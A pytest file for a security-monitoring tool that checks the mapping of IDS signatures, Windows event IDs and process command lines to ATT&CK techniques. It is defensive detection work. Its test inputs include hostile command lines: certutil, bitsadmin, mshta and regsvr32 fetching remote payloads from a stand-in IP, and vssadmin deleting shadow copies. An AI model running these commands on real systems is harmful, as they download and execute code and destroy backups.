"""ATT&CK mapping accuracy on real-world inputs, including benign look-alikes.

Signature names are real Emerging Threats / Suricata rule names (or their exact
format). Each benign case is one the old keyword rules mis-mapped.
"""

from __future__ import annotations

import pytest

from src.soc.correlate import TECHNIQUES
from src.soc.parsers import parse_winsec, signature_techniques

SIGNATURES = [
    # malicious
    ("ET SCAN Nmap Scripting Engine User-Agent Detected (Nmap Scripting Engine)", "", ["T1046"]),
    ("ET SCAN Potential SSH Scan", "Attempted Information Leak", ["T1046"]),
    ("ET SCAN Rapid POP3 Connections - Possible Brute Force Attack", "", ["T1110"]),
    ("ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT", "", ["T1190"]),
    ("ET EXPLOIT Apache log4j RCE Attempt (http ldap) (CVE-2021-44228)", "", ["T1190"]),
    ("ET EXPLOIT SQL injection probe on login form", "", ["T1190"]),  # not a "scan"
    ("ET DOS Possible NTP DDoS Inbound Frequent Un-Authed MON_LIST Requests", "", ["T1498"]),
    ("ET TROJAN Possible Mirai Variant CnC Beacon", "A Network Trojan was detected", ["T1071"]),
    ("ET MALWARE Win32/Agent Tesla SMTP Exfil", "", ["T1048"]),
    ("ET POLICY DNS Tunnel Detected (iodine)", "", ["T1048"]),
    ("SSH Excessive Login Attempts", "Attempted Administrator Privilege Gain", ["T1110"]),
    ("Custom rule: suspicious beacon", "Malware Command and Control Activity Detected", ["T1071"]),
    # benign / informational -> no technique (old rules: T1110 / T1190 / T1046)
    ("ET POLICY FTP Login Successful", "Misc activity", []),
    ("ET POLICY Cleartext Password in HTTP Request", "Potential Corporate Privacy Violation", []),
    ("ET INFO Observed DNS Query to .cloud TLD", "Potentially Bad Traffic", []),
    ("SURICATA STREAM excessive retransmissions", "Generic Protocol Command Decode", []),
    ("SURICATA HTTP request buffer overflow", "", []),
    ("ET POLICY Windows Update probe", "Not Suspicious Traffic", []),
]  # fmt: skip


@pytest.mark.parametrize(("sig", "category", "want"), SIGNATURES)
def test_signature_mapping(sig: str, category: str, want: list[str]) -> None:
    got = signature_techniques(sig, category)
    assert got == want, f"{sig!r} -> {got}, expected {want}"
    assert all(t in TECHNIQUES for t in got)


def _proc(cmd: str) -> list[str]:
    ev = parse_winsec({"Id": 4688, "Message": f"A new process has been created. {cmd}"})
    assert ev is not None
    return ev["techniques"]


@pytest.mark.parametrize(
    ("cmd", "want"),
    [
        ("powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi", ["T1059"]),
        ("certutil.exe -urlcache -split -f http://198.51.100.9/a.exe a.exe", ["T1105"]),
        ("bitsadmin /transfer job http://198.51.100.9/a.exe C:\\a.exe", ["T1105"]),
        ("mshta.exe \"javascript:a=GetObject('script:http://x/a.sct')\"", ["T1218"]),
        ("regsvr32 /s /n /u /i:http://198.51.100.9/file.sct scrobj.dll", ["T1218"]),
        ("vssadmin.exe delete shadows /all /quiet", ["T1490"]),
        # routine administration -> nothing (old rule matched every rundll32 call)
        ("rundll32.exe shell32.dll,Control_RunDLL desk.cpl", []),
        ("rundll32.exe printui.dll,PrintUIEntry /il", []),
        ("powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1", []),
        ("certutil -hashfile C:\\setup.exe SHA256", []),
    ],
)
def test_process_command_mapping(cmd: str, want: list[str]) -> None:
    assert _proc(cmd) == want


def test_windows_event_ids() -> None:
    def t(eid: int) -> list[str]:
        ev = parse_winsec({"Id": eid, "Message": "x"})
        assert ev is not None
        return ev["techniques"]

    assert t(4625) == ["T1110"] and t(4771) == ["T1110"] and t(4740) == ["T1110"]
    assert t(4648) == [] and t(4624) == []  # context-only, decided by the correlator
    assert t(4720) == ["T1136"] and t(4732) == ["T1098"] and t(1102) == ["T1070"]
    assert t(7045) == ["T1543"]


def test_alert_on_total_attack_probability(tmp_path, monkeypatch) -> None:
    """BENIGN 0.2 / DoS 0.4 / DDoS 0.4 is 80 % attack: it must alert (as the likeliest
    attack class), while a confidently benign flow must not."""
    from types import SimpleNamespace

    import numpy as np
    import pandas as pd

    from src.soc import engine
    from src.soc.rcl import RCL

    names = ["BENIGN", "DoS", "DDoS"]
    probs = np.log(np.array([[0.2, 0.41, 0.39], [0.9, 0.06, 0.04]]))
    monkeypatch.setattr(engine, "flow_logits", lambda det, df: probs)
    det = SimpleNamespace(
        label_names=names, feature_names=["x"], energy_threshold=None,
        reason=lambda c: f"{c} reason",
    )  # fmt: skip
    rcl = RCL(state_path=tmp_path / "s.json", feedback_path=tmp_path / "f.jsonl")
    out = engine.detect_flows(det, pd.DataFrame({"x": [1.0, 2.0]}), "test", rcl)
    assert len(out) == 1
    a = out[0]
    assert a["label"] == "DoS" and abs(a["confidence"] - 0.8) < 1e-6
    assert a["techniques"] == ["T1499"] and abs(a["class_confidence"] - 0.41) < 1e-6


def test_two_tier_alerting(tmp_path, monkeypatch) -> None:
    """Above the ~1%-false-alarm threshold: confirmed, techniques drive incidents.
    Between 0.5 and it: recorded as low severity, techniques only as candidates."""
    from types import SimpleNamespace

    import numpy as np
    import pandas as pd

    from src.soc import engine
    from src.soc.rcl import RCL

    names = ["BENIGN", "DoS", "PortScan"]
    probs = np.log(np.array([[0.02, 0.97, 0.01], [0.35, 0.60, 0.05], [0.95, 0.03, 0.02]]))
    monkeypatch.setattr(engine, "flow_logits", lambda det, df: probs)
    det = SimpleNamespace(
        label_names=names, feature_names=["x"], energy_threshold=None,
        alert_threshold_high=0.9, temperature=1.0, reason=lambda c: c,
    )  # fmt: skip
    rcl = RCL(state_path=tmp_path / "s.json", feedback_path=tmp_path / "f.jsonl")
    out = engine.detect_flows(det, pd.DataFrame({"x": [1.0, 2.0, 3.0]}), "t", rcl)
    assert [a["tier"] for a in out] == ["confirmed", "low"]  # benign flow: no alert
    hi, lo = out
    assert hi["techniques"] == ["T1499"] and hi["severity"] == 7
    assert lo["techniques"] == [] and lo["candidate_techniques"] == ["T1499"]
    assert lo["severity"] == 2 and lo["title"].startswith("Possible DoS")
